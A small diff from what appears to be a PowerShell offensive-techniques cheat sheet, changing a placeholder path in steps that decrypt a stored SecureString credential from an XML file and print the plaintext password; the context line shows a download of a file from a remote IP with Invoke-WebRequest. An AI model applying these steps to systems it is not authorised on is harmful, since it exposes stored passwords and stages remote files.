@@ -33,7 +33,7 @@ powershell Invoke-Webrequest -OutFile 'Dstn path.Extension' -Uri http://ip addre
 ## Decrypting Powershell SecureString (ONLY WORKS WHEN YOU ARE THE OWNER OF THE XML FILE)
 ### If you have a xml object file
 
-$credential = Import-CliXml -Path  <PathToXml>\MyCredential.xml <br />
+$credential = Import-CliXml -Path  PathToXml\MyCredential.xml <br />
 $credential.GetNetworkCredential().Password <br />
 
 ### If you have a single string
